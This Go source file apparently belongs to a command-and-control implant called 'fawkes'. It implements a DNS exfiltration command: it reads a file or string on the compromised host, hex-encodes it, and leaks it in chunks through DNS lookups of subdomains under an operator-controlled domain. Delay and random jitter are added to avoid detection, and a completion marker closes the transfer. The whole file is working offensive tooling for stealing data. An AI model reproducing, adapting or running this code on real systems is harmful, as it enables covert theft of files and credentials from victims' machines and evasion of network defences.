package commands

import (
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

const (
	// DNS label max is 63 chars, use 60 to leave room for sequence prefix
	dnsMaxLabelLen = 60
	// Max total domain length is 253 chars
	dnsMaxDomainLen = 253
)

// dnsExfil exfiltrates data by encoding it in DNS subdomain labels.
// Each DNS query encodes a chunk of data as hex in the subdomain:
//   <seq>.<hexdata>.<target-domain>
// The target domain must be a domain the operator controls with a DNS server
// that logs/captures queries (e.g., Burp Collaborator, custom NS).
func dnsExfil(args dnsArgs) structs.CommandResult {
	if args.Target == "" {
		return errorResult("Error: target domain required (domain you control with DNS logging)")
	}
	if args.Data == "" {
		return errorResult("Error: data parameter required (file path or raw string to exfiltrate)")
	}

	// Determine data source: file path or raw string
	var data []byte
	if info, err := os.Stat(args.Data); err == nil && !info.IsDir() {
		fileData, err := os.ReadFile(args.Data)
		if err != nil {
			return errorf("Error reading file %s: %v", args.Data, err)
		}
		data = fileData
	} else {
		data = []byte(args.Data)
	}

	if len(data) == 0 {
		return errorResult("Error: no data to exfiltrate (empty file or string)")
	}

	// Set defaults
	delay := args.Delay
	if delay <= 0 {
		delay = 100
	}
	jitter := args.Jitter
	if jitter < 0 {
		jitter = 50
	}

	// Calculate chunk size based on domain length constraints
	// Format: <seq>.<hexdata>.<target>
	// seq is up to 6 chars, dots take 2 chars
	targetLen := len(args.Target) + 1 // +1 for leading dot
	maxHexLen := dnsMaxDomainLen - targetLen - 8 // 8 = seq(6) + dots(2)
	if maxHexLen > dnsMaxLabelLen {
		maxHexLen = dnsMaxLabelLen
	}
	if maxHexLen <= 0 {
		return errorResult("Error: target domain too long for DNS exfiltration")
	}
	chunkSize := maxHexLen / 2 // hex encoding doubles size

	// Encode and send chunks
	hexData := hex.EncodeToString(data)
	totalChunks := (len(hexData) + maxHexLen - 1) / maxHexLen

	var sb strings.Builder
	sb.WriteString("DNS Exfiltration Started\n")
	sb.WriteString(fmt.Sprintf("  Domain: %s\n", args.Target))
	sb.WriteString(fmt.Sprintf("  Data size: %d bytes (%d hex chars)\n", len(data), len(hexData)))
	sb.WriteString(fmt.Sprintf("  Chunks: %d (chunk size: %d bytes)\n", totalChunks, chunkSize))
	sb.WriteString(fmt.Sprintf("  Delay: %dms (+%dms jitter)\n\n", delay, jitter))

	sent := 0
	errors := 0

	for i := 0; i < totalChunks; i++ {
		start := i * maxHexLen
		end := start + maxHexLen
		if end > len(hexData) {
			end = len(hexData)
		}
		chunk := hexData[start:end]

		// Build DNS query: <seq>.<chunk>.<domain>
		query := fmt.Sprintf("%06d.%s.%s", i, chunk, args.Target)

		// Perform DNS lookup (we don't care about the response)
		_, _ = net.LookupHost(query)
		sent++

		// Delay with jitter
		sleepMs := delay
		if jitter > 0 {
			sleepMs += rand.Intn(jitter)
		}
		time.Sleep(time.Duration(sleepMs) * time.Millisecond)
	}

	// Send completion marker
	completionQuery := fmt.Sprintf("fin.%06d.%s", totalChunks, args.Target)
	_, _ = net.LookupHost(completionQuery)

	sb.WriteString("Exfiltration Complete\n")
	sb.WriteString(fmt.Sprintf("  Sent: %d/%d chunks\n", sent, totalChunks))
	if errors > 0 {
		sb.WriteString(fmt.Sprintf("  Errors: %d\n", errors))
	}
	sb.WriteString(fmt.Sprintf("  Total DNS queries: %d (+ 1 completion marker)\n", sent))

	return successResult(sb.String())
}

// dnsExfilChunkSize calculates the max hex data per DNS label for a given domain.
// Exported for testing.
func dnsExfilChunkSize(targetDomain string) int {
	targetLen := len(targetDomain) + 1
	maxHexLen := dnsMaxDomainLen - targetLen - 8
	if maxHexLen > dnsMaxLabelLen {
		maxHexLen = dnsMaxLabelLen
	}
	if maxHexLen <= 0 {
		return 0
	}
	return maxHexLen / 2
}
